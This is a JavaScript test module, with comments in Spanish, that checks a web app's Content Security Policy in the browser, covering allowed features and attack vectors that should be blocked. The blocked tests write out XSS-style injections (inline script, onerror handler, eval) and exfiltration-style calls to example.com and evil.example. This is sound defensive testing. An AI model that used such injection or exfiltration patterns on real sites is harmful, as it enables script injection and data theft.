/* global FontFace, window, document, navigator, fetch, WebAssembly, Worker, Blob, URL, Image, XMLHttpRequest, WebSocket, setTimeout, getComputedStyle, location, Audio, console, HTMLFormElement */
// Matriz de compatibilidad con la CSP de producción. Se ejecuta en el navegador (módulo ES, mismo origen).
// Cada prueba registra {name, kind, ok, detail}: «allowed» = debe funcionar; «blocked» = debe ser BLOQUEADO por la CSP.
const params = new URLSearchParams(location.search);
const results = [];
const violations = [];
window.__probe = { done: false, results, violations };

document.addEventListener('securitypolicyviolation', (event) => {
  violations.push({
    directive: event.effectiveDirective,
    blocked: event.blockedURI,
    sample: event.sample,
  });
});

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const record = (name, kind, ok, detail) => results.push({ name, kind, ok, detail: String(detail) });

async function allowed(name, action) {
  const before = violations.length;
  try {
    const detail = await action();
    const extra = violations.slice(before);
    record(
      name,
      'allowed',
      extra.length === 0,
      extra.length ? `violaciones: ${JSON.stringify(extra)}` : (detail ?? 'ok'),
    );
  } catch (error) {
    record(name, 'allowed', false, `excepción: ${error && error.message ? error.message : error}`);
  }
}

async function blocked(name, directive, action) {
  const before = violations.length;
  let error = '';
  try {
    await action();
  } catch (caught) {
    error = String(caught && caught.message ? caught.message : caught);
  }
  await sleep(500);
  const hit = violations
    .slice(before)
    .find((v) => v.directive === directive || v.directive.startsWith(directive));
  record(
    name,
    'blocked',
    Boolean(hit),
    hit ? `${hit.directive} → ${hit.blocked}` : `NO bloqueado${error ? ` (error: ${error})` : ''}`,
  );
}

// 1×1 px PNG
const PNG_1PX =
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==';
const EMPTY_WASM = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]);

// ───────────── Lo que la app NECESITA y debe funcionar ─────────────
await allowed('fetch al mismo origen', async () => {
  const response = await fetch('/index.html');
  if (!response.ok) throw new Error(`HTTP ${response.status}`);
});

await allowed(
  'WebAssembly.instantiateStreaming (application/wasm + wasm-unsafe-eval)',
  async () => {
    const { instance } = await WebAssembly.instantiateStreaming(fetch('/assets/min-4f2a1c9e.wasm'));
    return `exports: ${Object.keys(instance.exports).length}`;
  },
);

await allowed('WebAssembly.compile/instantiate desde bytes', async () => {
  await WebAssembly.instantiate(EMPTY_WASM);
});

await allowed('Worker del mismo origen que instancia WASM', async () => {
  const worker = new Worker('/worker.js');
  const reply = await new Promise((resolve, reject) => {
    worker.onmessage = (event) => resolve(event.data);
    worker.onerror = (event) => reject(new Error(event.message || 'error de worker'));
    worker.postMessage(EMPTY_WASM);
  });
  worker.terminate();
  if (!reply.ok) throw new Error(reply.error);
});

await allowed('Worker de módulo (type: module) del mismo origen', async () => {
  const worker = new Worker('/worker.js', { type: 'module' });
  const reply = await new Promise((resolve, reject) => {
    worker.onmessage = (event) => resolve(event.data);
    worker.onerror = (event) => reject(new Error(event.message || 'error de worker'));
    worker.postMessage(EMPTY_WASM);
  });
  worker.terminate();
  if (!reply.ok) throw new Error(reply.error);
});

await allowed('Worker desde blob: + WASM + importScripts del mismo origen', async () => {
  const source = `
    self.onmessage = async (event) => {
      try {
        importScripts(event.data.lib);
        await WebAssembly.instantiate(event.data.wasm);
        self.postMessage({ ok: self.__fitroomLib === 'cargada' });
      } catch (error) { self.postMessage({ ok: false, error: String(error) }); }
    };`;
  const url = URL.createObjectURL(new Blob([source], { type: 'text/javascript' }));
  const worker = new Worker(url);
  const reply = await new Promise((resolve, reject) => {
    worker.onmessage = (event) => resolve(event.data);
    worker.onerror = (event) => reject(new Error(event.message || 'error de worker'));
    worker.postMessage({ wasm: EMPTY_WASM, lib: `${location.origin}/worker-lib.js` });
  });
  worker.terminate();
  URL.revokeObjectURL(url);
  if (!reply.ok) throw new Error(reply.error);
});

await allowed('imágenes data: y blob: (texturas generadas en runtime)', async () => {
  const load = (src) =>
    new Promise((resolve, reject) => {
      const image = new Image();
      image.onload = () => resolve(image.naturalWidth);
      image.onerror = () => reject(new Error(`no cargó ${src.slice(0, 30)}`));
      image.src = src;
    });
  await load(PNG_1PX);
  const canvas = document.createElement('canvas');
  canvas.width = canvas.height = 4;
  const blob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/png'));
  const url = URL.createObjectURL(blob);
  await load(url);
  URL.revokeObjectURL(url);
});

await allowed('estilos por CSSOM (element.style.*), como React/three/drei', async () => {
  const element = document.createElement('div');
  document.body.appendChild(element);
  element.style.color = 'rgb(255, 0, 0)';
  if (getComputedStyle(element).color !== 'rgb(255, 0, 0)')
    throw new Error('CSSOM no aplicó el estilo');
});

if (params.get('strictStyle') === '1') {
  // CSP candidata sin 'unsafe-inline': el CSSOM sigue funcionando (arriba), pero style="" y <style> inyectados se bloquean.
  await blocked(
    'style="" inyectado vía HTML (style-src sin unsafe-inline)',
    'style-src-attr',
    () => {
      const holder = document.createElement('div');
      holder.innerHTML = '<span style="color: rgb(0, 0, 255)">x</span>';
      document.body.appendChild(holder);
    },
  );
  await blocked('<style> inyectado (style-src sin unsafe-inline)', 'style-src-elem', () => {
    const style = document.createElement('style');
    style.textContent = '#root { background-color: rgb(1, 2, 3); }';
    document.head.appendChild(style);
  });
} else {
  await allowed(
    'estilos en línea (style="" y <style>): permitidos sólo por style-src \'unsafe-inline\'',
    async () => {
      const holder = document.createElement('div');
      holder.innerHTML = '<span id="inline-attr" style="color: rgb(0, 0, 255)">x</span>';
      document.body.appendChild(holder);
      if (getComputedStyle(holder.firstChild).color !== 'rgb(0, 0, 255)')
        throw new Error('style="" bloqueado');
      const style = document.createElement('style');
      style.textContent = '#inline-attr { background-color: rgb(1, 2, 3); }';
      document.head.appendChild(style);
      if (getComputedStyle(holder.firstChild).backgroundColor !== 'rgb(1, 2, 3)')
        throw new Error('<style> bloqueado');
    },
  );
}

await allowed(
  'cámara: getUserMedia({video}) → <video srcObject> reproduce (media-src mediastream:)',
  async () => {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById('cam');
    video.srcObject = stream;
    await video.play();
    await sleep(300);
    const size = `${video.videoWidth}x${video.videoHeight}`;
    stream.getTracks().forEach((track) => track.stop());
    if (!video.videoWidth) throw new Error('sin fotogramas');
    return size;
  },
);

await allowed(
  'Permissions-Policy: cámara permitida; micrófono, geolocalización, pago y USB denegados',
  async () => {
    const policy = document.featurePolicy;
    const state = Object.fromEntries(
      ['camera', 'microphone', 'geolocation', 'payment', 'usb'].map((f) => [
        f,
        policy.allowsFeature(f),
      ]),
    );
    const expected = {
      camera: true,
      microphone: false,
      geolocation: false,
      payment: false,
      usb: false,
    };
    if (JSON.stringify(state) !== JSON.stringify(expected)) throw new Error(JSON.stringify(state));
    return JSON.stringify(state);
  },
);

if (params.get('mediapipe') === '1') {
  await allowed(
    'MediaPipe PoseLandmarker REAL (wasm + modelo .task, delegado CPU) bajo la CSP',
    async () => {
      const { FilesetResolver, PoseLandmarker } = await import('/vendor/vision_bundle.mjs');
      const vision = await FilesetResolver.forVisionTasks('/wasm');
      const landmarker = await PoseLandmarker.createFromOptions(vision, {
        baseOptions: { modelAssetPath: '/models/pose_landmarker_lite.task', delegate: 'CPU' },
        runningMode: 'IMAGE',
        numPoses: 1,
      });
      const canvas = document.createElement('canvas');
      canvas.width = canvas.height = 128;
      const result = landmarker.detect(canvas);
      landmarker.close();
      return `landmarker creado; poses detectadas: ${result.landmarks.length}`;
    },
  );
} else {
  record(
    'MediaPipe PoseLandmarker REAL',
    'skipped',
    true,
    'sin apps/web/public/{wasm,models} (ejecuta scripts/fetch-models.mjs)',
  );
}

// ───────────── Lo que la CSP debe BLOQUEAR (si algo de esto funciona, hay un agujero) ─────────────
await blocked('script en línea inyectado (XSS clásico)', 'script-src', () => {
  window.__pwned = false;
  const script = document.createElement('script');
  script.textContent = 'window.__pwned = true';
  document.body.appendChild(script);
  if (window.__pwned) throw new Error('¡SE EJECUTÓ!');
});

await blocked('manejador en línea (<img onerror=…>)', 'script-src-attr', () => {
  const holder = document.createElement('div');
  holder.innerHTML = '<img src="/no-existe.png" onerror="window.__pwned2 = true">';
  document.body.appendChild(holder);
});

await blocked('eval()', 'script-src', () => {
  // eslint-disable-next-line no-eval
  window.eval('1 + 1');
});

await blocked('new Function()', 'script-src', () => {
  new Function('return 1')();
});

await blocked('setTimeout con cadena', 'script-src', () => {
  setTimeout('window.__pwned3 = true', 0);
});

await blocked('<script src> de un CDN externo', 'script-src', () => {
  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/npm/lodash@4/lodash.min.js';
  document.head.appendChild(script);
});

await blocked(
  'import() dinámico desde un host externo',
  'script-src',
  () => import('https://cdn.example.com/x.js'),
);

await blocked('fetch a un host externo (exfiltración)', 'connect-src', () =>
  fetch('https://example.com/collect', { method: 'POST', body: 'datos' }),
);
await blocked('XMLHttpRequest a un host externo', 'connect-src', () => {
  const request = new XMLHttpRequest();
  request.open('GET', 'https://example.com/x');
  request.send();
});
await blocked(
  'WebSocket a un host externo',
  'connect-src',
  () => new WebSocket('wss://example.com/socket'),
);
await blocked('navigator.sendBeacon a un host externo', 'connect-src', () => {
  navigator.sendBeacon('https://example.com/beacon', 'datos');
});

await blocked('<img> de un host externo (píxel de seguimiento)', 'img-src', () => {
  const image = new Image();
  image.src = 'https://example.com/pixel.gif';
});
await blocked('<link rel=stylesheet> externa', 'style-src', () => {
  const link = document.createElement('link');
  link.rel = 'stylesheet';
  link.href = 'https://fonts.googleapis.com/css2?family=Inter';
  document.head.appendChild(link);
});
await blocked('fuente (FontFace) de un host externo', 'font-src', async () => {
  const font = new FontFace('Externa', "url('https://example.com/f.woff2') format('woff2')");
  await font.load().catch(() => undefined);
});
await blocked('audio/vídeo externo', 'media-src', () => {
  const audio = new Audio();
  audio.src = 'https://example.com/a.mp3';
});
await blocked('<iframe> (frame-src hereda default-src none)', 'frame-src', () => {
  const frame = document.createElement('iframe');
  frame.src = '/';
  document.body.appendChild(frame);
});
await blocked('<object>/<embed>', 'object-src', () => {
  const object = document.createElement('object');
  object.data = '/probe.js';
  document.body.appendChild(object);
});
await blocked('envío de formulario (form-action none)', 'form-action', () => {
  const form = document.createElement('form');
  form.action = '/';
  form.method = 'post';
  document.body.appendChild(form);
  HTMLFormElement.prototype.submit.call(form);
});
await blocked('<base href> (base-uri none)', 'base-uri', () => {
  const base = document.createElement('base');
  base.href = 'https://evil.example/';
  document.head.appendChild(base);
});

window.__probe.done = true;
document.getElementById('root').textContent = `listo: ${results.length} comprobaciones`;
